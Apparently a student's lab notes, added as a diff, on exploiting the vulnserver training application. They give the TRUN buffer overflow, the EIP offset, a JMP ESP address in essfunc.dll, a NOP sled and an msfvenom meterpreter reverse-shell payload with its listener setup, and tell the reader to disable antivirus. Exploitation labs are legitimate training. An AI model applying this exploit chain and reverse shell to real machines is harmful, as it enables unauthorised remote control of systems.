@@ -1,0 +1,103 @@
+
+Windows Notes:
+
+I download vulnserver.exe and essfunc.dll
+From Powershell ISE ( cd /users/student/downloads where vulnserver.exe is )
+#Static Analysis
+strings.exe vulnserver.exe
+GUI > Properties
+#Behavioral Analysis
+run the file vulnserver.exe
+netstat -anob # I found vulnserver listening at 9999
+get-process | findstr /i <string to look for> ex: vulnserver
+open immunity debugger as admin
+vulnserver.exe should be running
+On Immunity Debugger file, attach ( a small window will pop, select attach )
+On ID, on windows option we can select different things like: log memmory, cpu etc for CTFS questions)
+press rewind button on top <<, then play buttom, ont he lower should say running
+
+On linuxops:
+vim winbuf.py
+
+#!/usr/bin/python
+import socket
+
+buf = "HELP"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  ##Creates socket
+s.connect(("10.50.132.32", 9999))   ##Connecting to Target/IP (In this case my windows ip )
+print s.recv(10204)  ##Prints response
+s.send(buf)  ##Sends value of buf
+print s.recv(1024)  ##Print response
+s.close()  ##Closes socket
+
+Before sending, restart and play on immunity debugger, 
+also check windows security needs to be off all security
+
+On linux-ops:
+python winbuf.py
+
+Change buf value "HELP" from winbuf.py and paste new lines:
+buf = "TRUN /.:/"
+buf += "A" * 5000
+
+On immunity: restart,play,check antivirus settings off
+run on lin-ops:
+python winbuf.py  
+EiP:0x4141414141
+On wiremask put 5000 on length and copy everything from pattern
+buf += "copy pattern for 5000"
+On immunity: restart,play,check antivirus settings off
+run on lin-ops:
+python winbuf.py
+copy new EIP vlaue into buffer 386F4337 gives 2003
+change script to :
+buf += "A" * 2003
+buf += "BBBB"
+On immunity: restart,play,check antivirus settings off
+run on lin-ops:
+python winbuf.py 
+EIP now is 0x42424242 which is good
+
+On immunity: 
+!mona modules lower search bar
+!mona jmp -r esp -m "essfunc.dll"  #go into window then log data
+copy top 5 from Mona command/Results:
+0x625011af
+0x625011bb
+0x625011c7
+0x625011d3
+0x625011df
+
+convert to little endian 0x625011af >> \xaf\x11\x50\x62
+delete line: buf += "BBBB"
+make new line JMP ESP: buf += "\xaf\x11\x50\x62"
+make new line NOP SLED: buf += "\x90"
+
+On linux-ops: msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.188.45 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
+(lhost=10.50.188.45 is my linux ip)
+copy and paste buf lines into script
+
+type this in script:
+
+#SETUP MSFCONSOLE ON lin-ops:
+'''
+msfconsole
+use multi/handler
+show options
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+'''
+
+On immunity: restart,play,check antivirus settings off
+run on lin-ops:
+python winbuf.py  
+the exploit should be succesful and I can be on meterpreter session
+
+ 
+
+
+
+
